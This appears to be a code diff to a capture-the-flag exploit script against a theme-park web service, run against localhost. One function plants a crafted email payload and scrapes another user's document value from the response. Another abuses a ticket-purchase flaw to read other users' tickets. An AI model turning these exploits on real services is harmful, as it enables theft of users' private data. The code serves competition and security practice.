@@ -1,3 +1,5 @@
+import re
+
 from client import Client
 from data import get_random_creds, get_park_request, get_random_document
 from models import RegisterRequest, AddAttractionRequest
@@ -22,11 +24,9 @@ def first_sploit(hostname, user_id):
     create_park_request.email = generate_email_payload(user_id)
     park_id = client.create_park(create_park_request)
 
-    r = native_client.get_park(park_id).text
-    flag_index = r.index("CTF{")
-    flag = r[flag_index:]
-    flag = flag[:flag.index("}")+1]
-    return flag
+    text = native_client.get_park(park_id).text
+    res = re.findall(r"Document = (.*?),", text)
+    return res[0] if len(res) > 0 else None
 
 
 def second_sploit(hostname, park_id, attraction_id):
@@ -42,7 +42,7 @@ def second_sploit(hostname, park_id, attraction_id):
 
     created_park_id = client.create_park(get_park_request(False))
     add_attraction_request = AddAttractionRequest(name=attraction_name, description="1", cost=1, ticket="faked_ticket")
-    added_attraction = client.add_attraction(created_park_id, add_attraction_request)
+    (_, added_attraction) = client.add_attraction(created_park_id, add_attraction_request)
 
     user = client.buy_ticket(added_attraction.id, user_id)
     flags = [x for x in user.purchasesInfo.purchases if x.name == attraction_name and x.ticket != "faked_ticket"]
@@ -50,8 +50,9 @@ def second_sploit(hostname, park_id, attraction_id):
 
 
 def main():
-    print(first_sploit("localhost", "ef3d89a5-37ab-4403-a9ef-9dfa36a5c83b"))
-    # print(second_sploit("localhost", "d58ad940-831f-43af-977f-cc673580514c", "b8e7253c-8310-4711-b057-345defa85b5b"))
+    # print(first_sploit("localhost", "51b87cf6-e768-4040-9682-06286ab6cabb"))
+    # print(second_sploit("localhost", "ec5d6db0-5d42-4200-8d81-8068689cc241", "885a0617-0b5b-4791-891d-5f899089bcc5"))
+    pass
 
 
 if __name__ == "__main__":
